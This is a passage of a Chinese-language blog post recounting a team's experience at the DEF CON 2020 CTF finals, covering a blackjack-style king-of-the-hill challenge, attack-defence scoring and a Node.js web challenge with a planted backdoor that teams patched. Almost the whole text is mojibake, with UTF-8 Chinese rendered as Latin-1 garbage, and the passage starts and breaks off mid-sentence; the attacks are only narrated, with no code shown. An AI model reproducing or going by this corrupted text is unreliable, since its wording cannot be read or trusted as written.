åˆ†ã€‚</p><p>ä¸€å¼€å§‹æ²¡ä»€ä¹ˆé˜Ÿä¼å¾—åˆ†ï¼Œç”±äºç»™å‡ºçš„æ˜¯ Web åœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬ä¸€å¼€å§‹å°±å½“ä½œ Web é¢˜æ¥åšäº†ï¼Œå„ç§æµ‹äº†æµ‹ï¼Œç„¶åå‘ç°è™½ç„¶è¿™ä¸ª Web å¹³å°æ˜¯ Flask å¹¶ä¸”å¼€äº† Debug ï¼Œä¸€ä¸ªä¸Šä¼ é”™è¯¯ç›´æ¥è·³åˆ°äº† Debug é”™è¯¯ç•Œé¢ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰æ‰¾åˆ°å…¶ä»–åœ°æ–¹æœ‰æ´å¯ä»¥åˆ©ç”¨æ¥è·å– PIN ç ï¼Œè¿™æ¡è·¯å°±ä½œåºŸäº†ã€‚</p><p>ç„¶ååå¤šåˆ†é’Ÿåï¼Œæˆ‘ä»¬æ¸æ¸å‘ç°è¿™ä¸ªå¯ä»¥çœ‹åˆ°å…¨å±€é˜Ÿä¼æ‰€æœ‰äººçš„ä¸Šä¼ æ–‡ä»¶ï¼Œè™½ç„¶æ–‡ä»¶æœ‰ä¸€å®šæ ¼å¼ï¼Œå¹¶ä¸”ç±»ä¼¼ä¸€ä¸ªæŒ‡ä»¤ç±»å‹çš„æ–‡ä»¶ï¼Œè™½ç„¶æˆ‘ä»¬å½“æ—¶çœ‹ä¸æ‡‚ï¼Œä½†æ˜¯å‘ç° A0E åœ¨å¾—åˆ†ä¹‹åï¼Œæˆ‘ä»¬æ‹¿ A0E çš„è¿‡æ¥ç”¨å°±å¯ä»¥ç›´æ¥å¾—åˆ†äº†ï¼ˆ</p><p>åé¢æ‰çŸ¥é“æˆ‘ä¸Šä¼ çš„æ–‡ä»¶æ˜¯ä¿®æ”¹äº†æˆ‘ä»¬æ¯æ¬¡ä¸‹æ³¨çš„ç§¯åˆ†ï¼Œå› ä¸ºåˆå§‹çš„æ—¶å€™æ¯ä¸ªé˜Ÿéƒ½ä¸€æ ·ï¼Œä¸€æ¬¡æŠŠè‡ªå®¶èº«å®¶200ä¸€æ¬¡ä¸‹å®Œï¼Œè€Œè¾“çš„æ¦‚ç‡åˆå¾ˆå¤§ï¼ŒåŸºæœ¬ç«‹é©¬å°±å‡ºå±€äº†ï¼Œç„¶è€Œé€šè¿‡ä¸€å¼€å§‹ç›´æ¥ä¸‹æ³¨ 1 ä¸ªç§¯åˆ†ï¼Œè¿™æ ·å°±å¯ä»¥ç«‹é©¬ç¨³ä½æˆ˜å±€ï¼Œè‡³å°‘å¯ä»¥ä¸ä¼šç«‹é©¬å‡ºå±€å°±å¯ä»¥æ’å‰äº”ä¸Šåˆ†äº†ã€‚äºæ˜¯æˆ‘ä»¬ä¸€å¼€å§‹å°±åœ¨ KOH ä¸Šåˆ†äº†ï¼Œå°±è¿™æ ·é€šè¿‡ KOH å¾—åˆ†ï¼Œæˆ‘ä»¬ç¨³ä½äº†å‰ä¸€å¤©çš„æ’åï¼Œç¬¬ä¸€å¤©çš„å¾—åˆ†ä¹Ÿå°±åŸºæœ¬å…¨éƒ½æ¥è‡ªäº KOH ã€‚</p><h2 id="Shift-2-amp-Shift-3"><a href="#Shift-2-amp-Shift-3" class="headerlink" title="Shift 2 &amp; Shift 3"></a>Shift 2 &amp; Shift 3</h2><p>ç”±äºæ—¶é—´ä¹Ÿæ¯”è¾ƒä¹…è¿œäº†ï¼Œæˆ‘è®°çš„ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥šï¼Œè¿™ä¸¤ä¸ª Shift å°±æ”¾ä¸€èµ·äº†ã€‚ç”±äºä¹‹å‰è²Œä¼¼å¤§å®¶æ²¡æ€ä¹ˆæ‰“ DEFCON QUALS æˆ–è€…è¯´æ‰“äº†çš„å¸ˆå‚…è¿™æ¬¡ Final æ²¡æ‰“ï¼Ÿæˆ‘ä»¬ä¸€å¼€å§‹å¹¶æ²¡æœ‰å‘ç° KOH é‚£ä¸ªé¢˜æ˜¯æ”¹è‡ª DEFCON QUALS Fountain OOO REliving ï¼Œæ˜¯ä¸€ä¸ª Golly ç›¸å…³çš„é€†å‘é¢˜ï¼Œå½“æ—¶çœ‹ QUALS çš„ WriteUp ä¹Ÿæ˜¯ç›¸å½“å´©æºƒçš„ï¼Œç”±äºæˆ‘è¿™ä¸ªå°èœé¸¡æ²¡ä»€ä¹ˆé€†å‘åŸºç¡€ï¼Œè·ŸæŸå¸ˆå‚…ç¡¬ç€å¤´çš®æä¹Ÿæ²¡æ€ä¹ˆæå‡ºæ¥ï¼Œè€Œè¿™ä¸ªè¿˜æ˜¯å‡çº§ç‰ˆï¼Œå½“æ—¶çœ‹è¿™ä¸ªé¢˜ç›®çš„é™„ä»¶å›¾è¿˜æ˜¯ä¸€è„¸æ‡µé€¼çš„ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack/blob/master/controller.png?raw=true" alt=""></p><p>åœ¨ Golly ä¸Šçå¼„æ›´æ˜¯ç›¸å½“æ‡µé€¼ã€‚è™½ç„¶é€†å‘å¸®ä¸ä¸Šå•¥ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ¯ä¸ª ROUND éƒ½çœ‹ä¸€çœ‹å„ä¸ªé˜Ÿä¼çš„è¡¨ç°ä»¥åŠç­–ç•¥ï¼Œç„¶åå‘ç°æ„Ÿè§‰ä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ•°å­¦æœŸæœ›é¢˜ï¼ˆï¼Ÿï¼‰ï¼Œæˆ‘å°±å°è¯•ç€ç®—ä¸€ä¸‹æ¯æ¬¡ä¸‹æ³¨å¤šå°‘æ‰èƒ½è®©æˆ‘ä»¬æ¯ä¸ª ROUND å¤§æ¦‚ç‡èƒ½åœ¨ç°æœ‰çš„é˜Ÿä¼ç­–ç•¥ä¸­èƒœå‡ºï¼Œç„¶åé€šè¿‡ä¸æ–­çš„è¯•ä¸æ–­çš„æ”¹ï¼Œåé¢åŸºæœ¬ä¸Šé è¿æ°”èƒ½æ‹¿ä¸‹ä¸å°‘åˆ†ï¼ˆ</p><p>åé¢æˆ‘ä»¬ AWD åˆ†æ•°ä¹Ÿèµ·æ¥äº†ï¼Œæˆªæ­¢åˆ° Shift 2 ç»“æŸï¼Œæˆ‘æˆªäº†ä¸€å¼ å½“æ—¶çš„å›¾ã€‚ï¼ˆçœ‹ç€å½“æ—¶çš„ KOH æ„Ÿè§‰å½“æ—¶è¿æ°”çœŸå¥½</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013001429.png" alt=""></p><p>åé¢åœ¨ Shift 3 çš„æ—¶å€™ï¼Œè¿™ä¸ª 21 ç‚¹çš„é¢˜ç›®ä¸€å¼€å§‹æ²¡å¤šä¹…å°±ä¸‹äº†ï¼Œäºæ˜¯æˆ‘åˆå¼€å§‹æ··èµ·æ¥äº†ï¼Œä¹Ÿå°±éšä¾¿çœ‹çœ‹å¹³å°ï¼Œç„¶åçœ‹çœ‹é˜Ÿå‹ä»¬åœ¨å¹²å•¥ï¼Œä¸­é—´è²Œä¼¼æœ‰ä¸€ä¸ª RPG æ¸¸æˆçš„ AWD é¢˜ç›®ï¼Œå½“æ—¶çœ‹ä»–ä»¬ç©èµ·æ¥æ„Ÿè§‰å¾ˆæœ‰æ„æ€ï¼Œå°±æ˜¯å¤§å®¶é€šè¿‡æ“æ§è‡ªå·±çš„è§’è‰²è¿›è¡Œå¯¹åº”çš„æ“ä½œæ‹¿ Flag ï¼Œè€Œä¸”è¿˜æ˜¯å…·æœ‰ä¸€å®šå®æ—¶æ“ä½œæ€§ï¼Œæ€»ä¹‹çœ‹èµ·æ¥ä»–ä»¬åœ¨æ‰“è¿™ä¸ªæ¸¸æˆéå¸¸æœ‰æ„æ€ XD</p><p>ç„¶ååé¢åˆæ”¾äº†ä¸¤ä¸ª KOH ï¼Œä¸€ä¸ªæ˜¯éå¸¸ Geek çš„å¼¹çƒæ¸¸æˆï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯å¼€é£èˆ¹æ‰“é£èˆ¹çš„æ¸¸æˆï¼Œä¸¤ä¸ªéƒ½æ˜¯é€†å‘ï¼Œä¹Ÿè®©æˆ‘æ··çš„æ˜¯ç†ç›´æ°”å£®ï¼ˆå¤§é›¾ï¼‰ï¼Œè™½ç„¶æˆ‘æƒ³å°½å¯èƒ½åœ°å¸®å¿™ï¼Œä½†æ˜¯çœŸæ˜¯èœçš„çœŸå®ï¼Œä¹Ÿå°±åˆ°å¤„çœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥å¸®å¿™çš„åœ°æ–¹ï¼Œæ¯”å¦‚ï¼Œæ‹¿å¤–å–ï¼ˆæµ·ç›—è™¾é¥­å¤–å–æ˜¯çœŸå¥½åƒï¼Œæ³¡é¢çœŸé¦™ï¼Œå¥½ä¹…æ²¡åƒæ³¡é¢äº†ï¼Œå‘œå‘œå‘œTATï¼‰</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003438.jpg" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003453.jpg" alt=""></p><p>æ˜¯æˆ‘æœ¬äººæ²¡é”™äº†ï¼ˆ</p><p>åé¢ä¸»åŠæ–¹å…¬å¸ƒäº† 21 ç‚¹çš„ WriteUp: <a href="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack" target="_blank" rel="noopener">https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack</a> </p><p>è™½ç„¶æ²¡æ€ä¹ˆçœ‹æ‡‚é€†å‘éƒ¨åˆ†ï¼Œä½†æ˜¯çœ‹èµ·æ¥æˆ‘ä»¬é‚£ä¸ªæ”¹ä¸‹æ³¨åˆ†æ•°çš„åšæ³•æ˜¯è§£æ³•ä¹‹ä¸€ï¼Œå¹¶ä¸”å…¶ä»–è§£æ³•çœ‹èµ·æ¥ä¹Ÿæ˜¯æŒºæœ‰æ„æ€çš„ã€‚</p><h2 id="Shift-4"><a href="#Shift-4" class="headerlink" title="Shift 4"></a>Shift 4</h2><p>åœ¨æœ€åä¸€å¤©å¼€å§‹å‡ å°æ—¶ä¹‹åï¼Œä¸»åŠæ–¹ç»ˆäºæ”¾å‡ºäº†ä¸€ä¸ªæœ¬åœºå”¯ä¸€ä¸€ä¸ª Web ï¼Œé¢˜ç›®åœ°å€åœ¨ <a href="https://github.com/o-o-overflow/dc2020f-nooode-public" target="_blank" rel="noopener">dc2020f-nooode-public</a> ï¼Œæ•´ä¸ªé¢˜ç›®æˆ‘å¼•ç”¨ PPP å¯¹äºè¿™ä¸ªé¢˜ç›®çš„è¯„ä»·â€”â€”â€œBy the start of the final day, all of us were pretty much at our limits. Fortunately, the OOO maintained a tradition of releasing <strong>silly web</strong> problems near the end of the competition, and this year was no exception.â€ï¼ˆæ­¤å¤„é‡‡ç”¨äº†å¼•ç”¨è®ºè¯ï¼Œå¼•ç”¨äº†æ¯”è¾ƒæƒå¨çš„äººå£«å¯¹äºé¢˜ç›®çš„è¯„ä»·ï¼Œå¢åŠ äº†è¯´æœåŠ›ï¼‰</p><p>åŸºæœ¬ä¸Šå¯ä»¥è¯´æ˜¯ä¸€å¥è¯åœ¨ Nodejs ä¸Šçš„å®Œç¾ä½“ç°ï¼Œäºæ˜¯ä¸€å¼€å§‹å°±æœ‰äººå¼€å§‹ç›´æ¥æ‰“äº†ï¼Œæˆ‘ä»¬ä¹Ÿé©¬ä¸Šå‘ç°äº†è¿™ä¸ª Backdooor ï¼Œäºæ˜¯æˆ‘ä»¬ä¹Ÿå¼€å§‹æ‰“ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ª Backdooor çœŸçš„æ˜¯ silly ï¼Œå¾ˆå¤šé˜Ÿéƒ½è¿…é€Ÿä¿®äº†ï¼ˆé™¤äº† pasten è²Œä¼¼æ²¡äººå‚èµ›ï¼‰ï¼Œåé¢ä¹Ÿå°±æ²¡ä»€ä¹ˆæ‰“æ³•äº†ã€‚åé¢é€šè¿‡æˆ‘ä»¬é˜Ÿé‡Œå·¨å¼ºçš„æŸå¸ˆå‚…ä¸Šäº†ä»–å†™çš„å·¨å¼ºçš„ WAF ï¼Œæˆ‘ä»¬æ‹¥æœ‰äº†å·¨å¼ºçš„é˜²å®ˆèƒ½åŠ›ã€‚</p><p>äºæ˜¯å°±è·Ÿ A0E æŸå¸ˆå‚…å°¬èŠäº†ï¼Œ</p><p>But æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€è½®çªç„¶æˆ‘ä»¬åˆå¯ä»¥æ‰“å¾ˆå¤šé˜Ÿï¼Œçªç„¶å‘ç°ä¸»åŠæ–¹è²Œä¼¼åˆåœ¨æ²¡æå‰é€šçŸ¥çš„æƒ…å†µä¸‹ï¼ˆä¹Ÿå¥½åƒæ˜¯é€šçŸ¥äº†æˆ‘æ²¡æ³¨æ„ï¼‰é‡ç½®äº†å„é˜Ÿä¼çš„ç¯å¢ƒï¼Œæˆ‘ä»¬å‘ç°äº†åˆç«‹é©¬ä¿®äº†ä¸€æ³¢ï¼Œç„¶åå‘ç°æ˜¯åŠ å¼ºäº† Check ï¼Œåªèƒ½æŠŠè¶…å¼ºå¸ˆå‚…å†™çš„è¶…å¼º WAF çæ‰äº†ï¼Œå› æ­¤åˆæ‰äº†ä¸€äº›åˆ†ï¼ˆ</p><p>But 